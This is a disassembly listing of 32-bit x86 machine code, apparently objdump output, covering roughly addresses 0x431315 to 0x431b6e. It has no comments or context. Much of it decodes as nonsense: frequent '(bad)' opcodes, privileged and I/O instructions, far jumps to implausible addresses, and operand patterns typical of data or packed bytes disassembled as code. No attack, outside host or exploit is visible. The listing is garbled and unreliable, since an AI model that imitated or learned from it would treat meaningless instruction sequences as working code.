  431315:	jne    0x43137d
  431317:	mov    DWORD PTR [ebp-0xba0048],eax
  43131d:	in     al,dx
  43131e:	outs   dx,BYTE PTR ds:[esi]
  43131f:	pushf  
  431320:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431326:	inc    DWORD PTR [ecx]
  431328:	inc    DWORD PTR [eax]
  43132a:	jae    0x431364
  43132c:	add    BYTE PTR [ebp+0x850266],al
  431332:	inc    DWORD PTR [ebp-0x1]
  431335:	mov    eax,eax
  431337:	jl     0x43139f
  431339:	add    BYTE PTR [ebp-0x740077],al
  43133f:	cld    
  431340:	dec    eax
  431341:	add    BYTE PTR [eax],0x1
  431344:	data16 add BYTE PTR [ebp+0x38],al
  431348:	mov    eax,0x47c2
  43134d:	mov    eax,0x824f89
  431352:	inc    edi
  431353:	mov    DWORD PTR [edx+0x64],ebp
  431356:	inc    WORD PTR [ebp-0x75]
  43135a:	(bad)  
  43135b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431362:	inc    ebp
  431363:	jge    0x431344
  431365:	add    bh,ah
  431367:	lea    ax,[ebp-0x750030]
  43136e:	add    al,0x46
  431371:	jmp    0x40ff:0x8885
  431377:	push   DWORD PTR [ebp+0x52]
  43137a:	lea    eax,[eax]
  43137c:	shl    BYTE PTR [esi-0x7b],1
  43137f:	test   esi,edi
  431381:	(bad)  
  431382:	(bad)  
  431383:	inc    DWORD PTR [ebp-0x990140]
  431389:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43138f:	inc    edi
  431390:	push   ecx
  431391:	xor    ax,WORD PTR [ebp-0x8d0045]
  431398:	add    al,al
  43139a:	ret    
  43139b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313a2:	push   eax
  4313a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313aa:	add    BYTE PTR [ebx-0x764f8839],al
  4313b0:	push   DWORD PTR [esi+0x1]
  4313b3:	inc    DWORD PTR [eax]
  4313b5:	mov    eax,0xff99ff
  4313ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313c0:	jne    0x43137a
  4313c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313cc:	mov    ecx,0xd74fb8
  4313d1:	add    cl,al
  4313d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313e0:	(bad)  
  4313e1:	push   ebp
  4313e3:	mov    eax,0x8c2789
  4313e8:	ret    0x6689
  4313eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4313ef:	add    bh,ah
  4313f1:	mov    WORD PTR [ebp-0x70],ax
  4313f5:	(bad)  
  4313f6:	ret    0x667d
  4313f9:	or     BYTE PTR [ebp-0x77],dl
  4313fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431403:	loop   0x43138e
  431405:	(bad)  
  431406:	xchg   esi,eax
  431407:	aam    0xcf
  431409:	out    dx,al
  43140a:	mov    DWORD PTR [esi-0x68],edi
  43140d:	inc    ebp
  43140e:	dec    edx
  43140f:	pop    ecx
  431410:	mov    edx,DWORD PTR [eax]
  431412:	repnz push bp
  431415:	or     BYTE PTR [ebx+0x55106638],0x49
  43141c:	(bad)  
  43141d:	repnz xor eax,0xa0898945
  431423:	mov    ah,0x89
  431425:	jmp    DWORD PTR [edx+0x66b0418d]
  43142b:	inc    DWORD PTR [ebp+0x50]
  43142e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431432:	mov    DWORD PTR [eax],ecx
  431434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431435:	pop    es
  431436:	inc    ecx
  431437:	(bad)  
  431438:	data16 fwait
  43143a:	inc    ebp
  43143b:	xor    ah,BYTE PTR [esi+0x3]
  43143e:	dec    ebp
  43143f:	push   eax
  431440:	inc    bp
  431442:	jge    0x4313c7
  431444:	mov    esp,DWORD PTR [esi-0x18]
  431447:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43144d:	add    DWORD PTR [ebx],esi
  43144f:	add    BYTE PTR [ebx],al
  431451:	test   DWORD PTR [ebx],esi
  431453:	(bad)  
  431454:	inc    WORD PTR [ebp+0x0]
  431458:	mov    eax,DWORD PTR [eax]
  43145a:	call   0x8898cb8f
  43145f:	mov    esi,eax
  431461:	clc    
  431462:	ret    
  431463:	rol    cl,0xa
  431466:	mov    DWORD PTR ds:0x7c0ec88,esi
  43146c:	mov    edx,edi
  43146e:	pushf  
  43146f:	pop    es
  431470:	jmp    FWORD PTR [edx+0x66]
  431473:	add    BYTE PTR [ebp-0x990175],al
  431479:	inc    ebp
  43147a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431480:	push   ebp
  431481:	mov    edi,eax
  431483:	mov    dh,BYTE PTR [eax+0x266ff51]
  431489:	push   ebp
  43148a:	add    BYTE PTR [ebx-0x764b0777],al
  431490:	dec    DWORD PTR [esi+0x661851e8]
  431496:	add    BYTE PTR [ebp-0x7b],dl
  431499:	cmp    esi,0xfffffffb
  43149c:	dec    DWORD PTR [ecx+0x51fe9285]
  4314a2:	jmp    DWORD PTR [esi-0x75]
  4314a5:	push   ebp
  4314a6:	hlt    
  4314a7:	data16 (bad) 
  4314a9:	dec    ebp
  4314aa:	ret    
  4314ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314b1:	lea    edx,[eax-0x1]
  4314b4:	jne    0x431487
  4314b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314bc:	dec    BYTE PTR [ecx+0x51559eff]
  4314c2:	mov    DWORD PTR [esi-0x4c],esp
  4314c5:	push   ebp
  4314c6:	jmp    DWORD PTR [esi-0x18]
  4314c9:	inc    ebp
  4314ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314d0:	(bad)  
  4314d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314d2:	inc    eax
  4314d4:	test   DWORD PTR [esi-0x2],esp
  4314d7:	inc    ebp
  4314d8:	dec    DWORD PTR [ebp-0x760bde75]
  4314de:	(bad)  
  4314df:	test   al,0xc3
  4314e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314e7:	lods   al,BYTE PTR ds:[esi]
  4314e8:	push   eax
  4314e9:	inc    ebp
  4314ea:	jne    0x4314fb
  4314ec:	dec    DWORD PTR [ebp+0x8]
  4314ef:	mov    ecx,DWORD PTR [ebx]
  4314f1:	sbb    al,0x0
  4314f3:	(bad)  
  4314f4:	mov    eax,0xc14fc3
  4314f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4314ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431503:	xor    eax,DWORD PTR [eax]
  431505:	add    eax,edi
  431507:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43150d:	xor    edi,DWORD PTR [eax+0x854f66]
  431513:	dec    BYTE PTR [ecx-0x76bb01]
  431519:	mov    BYTE PTR [ebx-0x76724001],al
  43151f:	pushf  
  431520:	inc    esi
  431521:	(bad)  
  431522:	dec    DWORD PTR [ebp-0x7abe6373]
  431528:	sar    esi,0x89
  43152b:	dec    DWORD PTR [eax+0x0]
  43152e:	inc    DWORD PTR [eax]
  431530:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431537:	xlat   BYTE PTR ds:[ebx]
  431538:	dec    edx
  431539:	add    bh,bh
  43153b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431541:	lea    esp,[esi-0x50]
  431544:	(bad)  
  431545:	(bad)  
  431546:	call   DWORD PTR [eax-0x1]
  431549:	inc    ebp
  43154a:	rdpmc  
  43154c:	add    BYTE PTR [ebx],al
  43154e:	push   ax
  431550:	lea    eax,[ebp-0x1]
  431556:	js     0x431557
  431558:	add    al,bh
  43155a:	push   bp
  43155c:	lea    ecx,[ebp-0x7701]
  431562:	fmul   DWORD PTR [ebp-0x7a997800]
  431568:	(bad)  
  431569:	(bad)  
  43156a:	(bad)  
  43156b:	(bad)  
  43156c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431572:	dec    eax
  431573:	mov    eax,0x8d8dffff
  431578:	mov    al,0xb0
  43157a:	(bad)  
  43157b:	call   DWORD PTR [ecx+0x50]
  43157e:	dec    ebp
  43157f:	inc    ebp
  431580:	mov    esi,0x7030833
  431585:	push   eax
  431586:	into   
  431587:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43158d:	call   DWORD PTR [ecx-0x8]
  431590:	lea    edx,[ebp-0x1]
  431593:	jmp    0x761797
  431598:	inc    eax
  431599:	jnp    0x431528
  43159b:	add    dh,bh
  43159d:	inc    WORD PTR [ebp-0x8a00b0]
  4315a4:	mov    edx,eax
  4315a6:	inc    esp
  4315a7:	add    bh,bh
  4315a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315af:	dec    DWORD PTR [ebx-0x7f820301]
  4315b5:	add    BYTE PTR [ecx],al
  4315b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4315be:	inc    eax
  4315c0:	(bad)  
  4315c1:	dec    si
  4315c3:	test   edi,edi
  4315c5:	(bad)  
  4315c6:	cmp    edi,edi
  4315c8:	add    ecx,DWORD PTR [edi-0x39]
  4315cb:	mov    edx,DWORD PTR [edx+0x66]
  4315ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4315d4:	mov    eax,0x66ff8b5e
  4315da:	jmp    0xb4ff:0xc7ff3895
  4315e1:	push   ecx
  4315e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315e8:	call   DWORD PTR [esi-0x1]
  4315eb:	dec    DWORD PTR [eax]
  4315ed:	mov    ecx,0x805ff
  4315f2:	inc    ebp
  4315f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4315f9:	mov    ecx,0x35784
  4315fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431604:	inc    ebp
  431605:	mov    ecx,0x9c6131
  43160a:	(bad)  
  43160b:	mov    eax,ebx
  43160d:	pop    esp
  43160e:	test   edi,edi
  431610:	clc    
  431611:	lea    eax,[ebp-0x24]
  431614:	cmp    eax,0xc7fe9c8d
  431619:	push   eax
  43161b:	lea    eax,[ebp+0x45fff8fe]
  431621:	mov    esi,DWORD PTR [ecx]
  431623:	hlt    
  431624:	lahf   
  431625:	push   esp
  431626:	mov    edx,DWORD PTR [ecx-0x4]
  431629:	xor    eax,DWORD PTR [eax+0x7201bb]
  43162f:	add    BYTE PTR [ebp-0x35],al
  431632:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431638:	mov    edx,DWORD PTR [ecx-0x74]
  43163b:	rol    BYTE PTR [eax],0x8d
  43163e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431642:	nop
  431643:	push   ecx
  431644:	add    bh,bh
  431646:	mov    esp,edi
  431648:	in     al,0x85
  43164a:	jge    0x43164a
  43164c:	test   edi,edi
  43164e:	jne    0x4315d5
  431650:	(bad)  
  431651:	(bad)  
  431652:	sbb    bh,bh
  431654:	push   ebp
  431655:	inc    ebp
  431656:	call   0xffdc10e6
  43165b:	add    BYTE PTR [ebp+0x66],al
  43165e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431664:	cmp    al,0x85
  431666:	ud0    eax,DWORD PTR [ebp-0x1]
  43166a:	test   DWORD PTR [edi+0x74],ecx
  43166d:	dec    edi
  43166e:	inc    DWORD PTR [ebp-0x530004]
  431674:	dec    DWORD PTR [edi-0x75]
  431677:	dec    esi
  431678:	cld    
  431679:	test   DWORD PTR [eax+0xff01ff],eax
  43167f:	icebp  
  431680:	add    BYTE PTR [edi-0x3a],cl
  431683:	test   ebx,eax
  431685:	inc    BYTE PTR [ebp-0x1]
  431688:	jne    0x43168a
  43168a:	mov    eax,DWORD PTR [eax]
  43168c:	cld    
  43168d:	xor    BYTE PTR [ecx+0x500155],cl
  431693:	push   ebp
  431694:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43169a:	add    BYTE PTR [ebp+0x35e90f50],al
  4316a0:	add    al,BYTE PTR [eax]
  4316a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316a8:	add    ah,ch
  4316aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4316b0:	jmp    0xdf19a6
  4316b5:	(bad)  
  4316b6:	nop    ecx
  4316b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4316bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4316c2:	mov    eax,edi
  4316c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4316c7:	add    eax,0x45fef885
  4316cc:	dec    DWORD PTR [ebx+0x339445]
  4316d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316d8:	dec    DWORD PTR [ebx-0x460f0375]
  4316de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316df:	add    esi,edi
  4316e1:	add    bh,bh
  4316e3:	rdpmc  
  4316e5:	add    BYTE PTR [ebx],0x1
  4316e8:	mov    DWORD PTR [eax],eax
  4316ea:	add    al,0x45
  4316ec:	dec    DWORD PTR [ecx-0x360b3373]
  4316f2:	dec    DWORD PTR [esi]
  4316f4:	push   eax
  4316f5:	jne    0x43173c
  4316f7:	mov    esi,DWORD PTR [ebx]
  4316f9:	cld    
  4316fa:	add    esp,ecx
  4316fc:	push   eax
  4316fd:	inc    DWORD PTR [ebp-0x75]
  431700:	add    eax,0x800e4
  431705:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43170b:	mov    DWORD PTR [ecx],eax
  43170d:	sbb    al,0x0
  43170f:	leave  
  431710:	test   DWORD PTR [edi-0x2],eax
  431713:	jne    0x431714
  431715:	call   0xff44011a
  43171a:	xor    BYTE PTR [ebp+0x4d],al
  43171d:	mov    edi,edi
  43171f:	enter  0x8,0x4d
  431723:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431729:	mov    eax,DWORD PTR [eax]
  43172b:	cld    
  43172c:	add    DWORD PTR [ecx],ebx
  43172e:	inc    ebp
  43172f:	dec    ebp
  431730:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431736:	inc    eax
  431737:	dec    DWORD PTR [ecx-0x270375]
  43173d:	add    BYTE PTR [ebx-0x39d72701],cl
  431743:	xchg   ecx,eax
  431744:	ret    
  431745:	add    BYTE PTR [ebp-0x830075],al
  43174b:	add    BYTE PTR [ebp-0x75],al
  43174e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431754:	lea    edi,[edi-0xc]
  431757:	add    bh,bh
  431759:	mov    edx,DWORD PTR [eax-0x7b]
  43175c:	inc    ebp
  43175d:	rdpmc  
  43175f:	jne    0x431764
  431761:	add    BYTE PTR [eax-0x75],dl
  431764:	inc    ebp
  431765:	clc    
  431766:	add    eax,0x400009
  43176b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431771:	mov    eax,DWORD PTR [ecx]
  431773:	in     al,dx
  431774:	add    dh,al
  431776:	test   ebx,eax
  431778:	inc    BYTE PTR [ebp-0xff0001]
  43177e:	add    BYTE PTR [ebp-0x43],al
  431781:	cmp    esi,0xfffffff8
  431784:	(bad)  
  431785:	push   DWORD PTR [eax]
  431787:	add    BYTE PTR [ebp-0x3a],dl
  43178a:	test   ebx,eax
  43178c:	je     0x431713
  43178e:	mov    edi,edi
  431790:	sbb    al,0xff
  431792:	test   DWORD PTR gs:[eax],eax
  431795:	(bad)  
  431796:	js     0x431797
  431798:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43179e:	sub    eax,ebx
  4317a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317a6:	add    eax,DWORD PTR [eax]
  4317a8:	dec    ebp
  4317a9:	push   eax
  4317aa:	mov    al,BYTE PTR [ebp+0x1]
  4317ad:	mov    eax,DWORD PTR [ebp-0x68]
  4317b0:	mov    eax,DWORD PTR [eax]
  4317b2:	sbb    bh,al
  4317b4:	or     ah,dh
  4317b6:	dec    ebp
  4317b7:	inc    DWORD PTR [eax+0x4]
  4317ba:	push   ecx
  4317bb:	add    BYTE PTR [edx-0x1],dh
  4317be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317d4:	push   ecx
  4317d5:	cmp    BYTE PTR [ebx],al
  4317d7:	inc    ebp
  4317d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317de:	(bad)  
  4317df:	(bad)  
  4317e0:	in     al,0xff
  4317e2:	add    BYTE PTR [ebp+0x0],al
  4317e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317eb:	add    al,bh
  4317ed:	(bad)  
  4317ee:	jmp    0x8d85:0x74b0558d
  4317f5:	dec    DWORD PTR [eax]
  4317f7:	call   DWORD PTR [ebp-0x7b]
  4317fa:	mov    edi,esi
  4317fc:	lock call DWORD PTR [ebp-0x75]
  431800:	mov    esi,esp
  431802:	mov    ah,0xc6
  431804:	mov    bh,0xc3
  431806:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43180c:	add    DWORD PTR [eax],0x450050ff
  431812:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431818:	inc    edi
  43181a:	push   esp
  43181c:	jmp    0xcd00:0x650481ff
  431823:	mov    DWORD PTR [ebx],esi
  431825:	clc    
  431826:	cmp    edi,0xff9cff3c
  43182c:	jne    0x431836
  43182e:	mov    eax,eax
  431830:	add    esi,DWORD PTR [eax]
  431832:	int3   
  431833:	inc    ebp
  431834:	cmp    al,0x83
  431836:	add    BYTE PTR [eax],bl
  431838:	adc    DWORD PTR [ebx+0x768b5055],eax
  43183e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431844:	mov    edi,eax
  431846:	cmp    BYTE PTR [ebp+0x45],cl
  431849:	jmp    0x4317d6
  43184b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43184e:	inc    ebp
  43184f:	or     al,0x2
  431851:	dec    DWORD PTR [ebp+0x18]
  431854:	jne    0x4318ab
  431856:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43185c:	mov    edi,DWORD PTR [ebx]
  43185e:	in     al,0x50
  431860:	xchg   ecx,eax
  431861:	jmp    0x3436766
  431866:	adc    al,0x8b
  431868:	inc    ebp
  431869:	mov    al,ds:0x8b04008b
  43186e:	push   ebp
  43186f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431875:	push   ebp
  431876:	test   DWORD PTR [ebx-0x2800d701],ecx
  43187c:	inc    ebp
  43187d:	dec    ebp
  43187e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431884:	mov    DWORD PTR [eax],0xe9ff00f4
  43188a:	add    al,0x0
  43188c:	add    BYTE PTR [eax],al
  43188e:	mov    eax,edx
  431890:	push   eax
  431891:	rol    DWORD PTR [ebp-0xf0177],1
  431897:	bound  eax,QWORD PTR [ebp+0x50]
  43189a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318a6:	mov    al,0xf
  4318a8:	test   DWORD PTR [edx],edx
  4318aa:	call   DWORD PTR [ebp-0x7a0001]
  4318b0:	(bad)  
  4318b1:	loop   0x4318b2
  4318b3:	jnp    0xc6990cb9
  4318b9:	mov    eax,ebx
  4318bb:	cmp    al,0x8b
  4318bd:	(bad)  
  4318be:	cld    
  4318bf:	shr    esi,0xc
  4318c2:	add    dl,al
  4318c4:	push   eax
  4318c5:	lea    eax,[ebp-0x1]
  4318c8:	mov    edx,esi
  4318ca:	cwde   
  4318cb:	cli    
  4318cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318d2:	or     BYTE PTR [eax],cl
  4318d4:	inc    ebp
  4318d5:	dec    ebp
  4318d6:	inc    DWORD PTR [ebx+0x74803914]
  4318dc:	add    DWORD PTR [ebx+0x451800],ecx
  4318e2:	call   DWORD PTR [eax+edx*1]
  4318e5:	add    ecx,DWORD PTR [ebp-0x34]
  4318e8:	push   edi
  4318e9:	adc    al,0x8
  4318eb:	mov    edx,DWORD PTR [ebp-0x14]
  4318ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4318f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318f5:	inc    DWORD PTR [eax+esi*8]
  4318f8:	inc    ebp
  4318f9:	stos   BYTE PTR es:[edi],al
  4318fa:	mov    edx,DWORD PTR [ebp-0x4]
  4318fd:	add    DWORD PTR [ebp-0x1c],eax
  431900:	mov    edx,DWORD PTR [ebp-0x70]
  431903:	cmp    eax,DWORD PTR [eax]
  431905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431906:	mov    eax,DWORD PTR [eax]
  431908:	cld    
  431909:	jae    0x43188b
  43190b:	add    eax,DWORD PTR [ecx]
  43190d:	clc    
  43190e:	add    BYTE PTR [eax+0x30],dl
  431911:	mov    DWORD PTR [ecx],esi
  431913:	clc    
  431914:	pop    ds
  431915:	inc    ebp
  431916:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43191c:	(bad)  
  43191d:	push   DWORD PTR [edi]
  43191f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431925:	(bad)  
  431926:	jae    0x431927
  431928:	mov    eax,DWORD PTR [ebp-0x740175]
  43192e:	sub    eax,DWORD PTR [eax]
  431930:	add    eax,DWORD PTR [eax]
  431932:	mov    DWORD PTR [ecx+0x5f],eax
  431935:	mov    DWORD PTR [ebx-0x4],ebx
  431938:	ret    0xff
  43193b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431941:	ret    
  431942:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431948:	add    BYTE PTR [ebp-0x7d],al
  43194b:	mov    DWORD PTR [eax],eax
  43194d:	add    al,0x84
  43194f:	inc    DWORD PTR [ecx]
  431951:	lea    eax,[eax]
  431953:	hlt    
  431954:	sar    bh,cl
  431956:	test   BYTE PTR [eax+0x1],dl
  431959:	inc    ebp
  43195a:	add    BYTE PTR [ebx],dh
  43195c:	test   BYTE PTR [ebx],0x84
  43195f:	push   eax
  431960:	add    BYTE PTR [ebp+0x0],al
  431963:	add    eax,0x86
  431968:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43196e:	add    BYTE PTR [ecx],al
  431970:	add    BYTE PTR [eax],al
  431972:	mov    esi,0x550030
  431977:	mov    ecx,DWORD PTR [edi]
  431979:	cld    
  43197a:	fidiv  DWORD PTR [ebp+0x0]
  43197d:	mov    edi,DWORD PTR [ecx]
  43197f:	xor    BYTE PTR [eax+eax*1],0x84
  431983:	add    eax,DWORD PTR [eax]
  431985:	sbb    BYTE PTR [eax],al
  431987:	jne    0x43193a
  431989:	mov    eax,DWORD PTR [ecx]
  43198b:	sbb    BYTE PTR [eax],al
  43198d:	mov    DWORD PTR [ebp-0x1],esp
  431990:	add    BYTE PTR [eax+0x30e45ca],bh
  431996:	ret    0xb7fc
  431999:	dec    ebp
  43199a:	or     al,0x89
  43199c:	dec    ebp
  43199d:	cld    
  43199e:	cmovne ecx,DWORD PTR [eax-0x75]
  4319a2:	add    edi,esp
  4319a4:	seto   BYTE PTR [esi-0x72ffffff]
  4319ab:	inc    ebp
  4319ac:	adc    al,0x8b
  4319ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319b5:	cmp    DWORD PTR [edi+0x72],edx
  4319b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319be:	gs cmp al,0x0
  4319c1:	je     0x431999
  4319c3:	push   eax
  4319c4:	sar    BYTE PTR [eax],1
  4319c6:	mov    bh,0x3e
  4319c8:	push   cs
  4319c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319cf:	add    DWORD PTR [ecx+0x12],ebp
  4319d2:	dec    edx
  4319d3:	(bad)  
  4319d4:	mov    eax,edx
  4319d6:	in     al,dx
  4319d7:	adc    DWORD PTR [ecx],esi
  4319d9:	pop    esi
  4319da:	inc    ecx
  4319db:	leave  
  4319dc:	or     DWORD PTR [eax],ebx
  4319de:	gs push ebp
  4319e0:	add    ah,ch
  4319e2:	into   
  4319e3:	in     al,dx
  4319e4:	enter  0xb756,0xf0
  4319e8:	push   cs
  4319e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319f9:	jnp    0x74439f01
  4319ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a05:	add    BYTE PTR [edi],cl
  431a07:	mov    edi,DWORD PTR [ecx-0x78]
  431a0a:	ltr    WORD PTR [ecx-0x7b]
  431a0e:	dec    DWORD PTR [edi]
  431a10:	clc    
  431a11:	out    0x45,eax
  431a13:	add    BYTE PTR [eax],cl
  431a15:	cmp    ebx,0xffffff8c
  431a18:	jge    0x431a1a
  431a1a:	jb     0x431a2c
  431a1c:	je     0x521a9c
  431a22:	pop    edx
  431a23:	push   esi
  431a24:	mov    ecx,DWORD PTR [edi]
  431a26:	in     al,dx
  431a27:	rol    DWORD PTR [ebp+0x0],1
  431a2a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a31:	cmp    DWORD PTR [ecx],0xfffffff0
  431a34:	hlt    
  431a35:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a3b:	(bad)  
  431a3d:	push   eax
  431a3e:	jns    0xb842febc
  431a44:	lock push cs
  431a46:	ror    edx,0x3
  431a49:	test   BYTE PTR [ecx+0x5500e800],cl
  431a4f:	dec    eax
  431a50:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a54:	(bad)  
  431a55:	mov    esi,0x7f33ff5f
  431a5a:	inc    eax
  431a5b:	test   DWORD PTR [edx],eax
  431a5d:	je     0x431a1f
  431a5f:	mov    ecx,ecx
  431a61:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a65:	and    eax,DWORD PTR [eax+0xf0103]
  431a6b:	jp     0x431a59
  431a6d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a71:	add    edx,DWORD PTR [edi+0x74]
  431a74:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a7a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a80:	je     0x431a05
  431a82:	cmp    eax,edi
  431a84:	js     0x431aa9
  431a86:	add    eax,0xeb0fc003
  431a8b:	jns    0x431a18
  431a8d:	vmread DWORD PTR [ecx+0x45],ebx
  431a91:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a97:	adc    al,0x8b
  431a99:	jge    0x431aaf
  431a9b:	mov    edi,DWORD PTR [eax-0x4]
  431a9e:	add    edi,DWORD PTR [edi]
  431aa0:	or     bh,bh
  431aa2:	push   ebp
  431aa3:	push   es
  431aa4:	mov    DWORD PTR [ebp-0x4],ebx
  431aa7:	add    edi,esi
  431aa9:	pop    es
  431aaa:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ab0:	mov    DWORD PTR [esp+esi*8],ecx
  431ab3:	inc    ebp
  431ab4:	pop    ebp
  431ab5:	xor    DWORD PTR [esi-0x4],0x3b
  431ab9:	add    edx,DWORD PTR [ecx+edi*1]
  431abc:	push   es
  431abd:	clc    
  431abe:	mov    bh,0xdb
  431ac0:	jp     0x431a79
  431ac2:	add    cl,BYTE PTR [esi]
  431ac4:	div    DWORD PTR [edi+0x4d8b0c1c]
  431aca:	test   edi,edi
  431acc:	je     0x431ac2
  431ace:	mov    eax,ecx
  431ad0:	or     BYTE PTR [ebx],al
  431ad2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431ad8:	jbe    0x431b4c
  431ada:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431ae0:	add    ecx,DWORD PTR [esi]
  431ae2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431ae8:	add    eax,DWORD PTR [ebx-0x287af783]
  431aee:	je     0x431b3d
  431af0:	mov    DWORD PTR [ecx],edi
  431af2:	mov    esi,eax
  431af4:	hlt    
  431af5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431afc:	jb     0x431abe
  431afe:	jmp    0x431aeb
  431b00:	xor    esi,DWORD PTR [ebx]
  431b02:	pop    edi
  431b03:	pop    esi
  431b04:	pop    ebx
  431b05:	ret    
  431b06:	ret    0x8b
  431b09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b0f:	xor    DWORD PTR [ecx],0xc
  431b12:	pushf  
  431b13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b19:	rdmsr  
  431b1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b22:	dec    ebp
  431b23:	ret    
  431b24:	mov    edi,DWORD PTR [esi-0x4]
  431b27:	pop    eax
  431b28:	dec    ebp
  431b29:	jne    0x431ab6
  431b2b:	xor    edi,esp
  431b2d:	inc    eax
  431b2e:	dec    ebp
  431b2f:	jbe    0x431b84
  431b31:	inc    eax
  431b32:	pop    ebp
  431b33:	add    edx,DWORD PTR [esi+0x8]
  431b36:	push   esp
  431b37:	dec    eax
  431b38:	push   ecx
  431b39:	mov    eax,edi
  431b3b:	and    al,0xf0
  431b3d:	jo     0x431b2a
  431b3f:	mov    eax,DWORD PTR [ebx]
  431b41:	sbb    BYTE PTR [ebp+0x4d],cl
  431b44:	mov    eax,DWORD PTR [ebx]
  431b46:	nop
  431b47:	or     BYTE PTR [eax],al
  431b49:	jne    0x431ba2
  431b4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b51:	cld    
  431b52:	xor    edi,edi
  431b54:	add    edi,DWORD PTR [ebp+0x3]
  431b57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b5d:	js     0x431ae3
  431b5f:	jae    0x431b63
  431b61:	(bad)  
  431b63:	xor    al,0x5d
  431b65:	jmp    0x431af2
  431b67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b6e:	fdecstp 
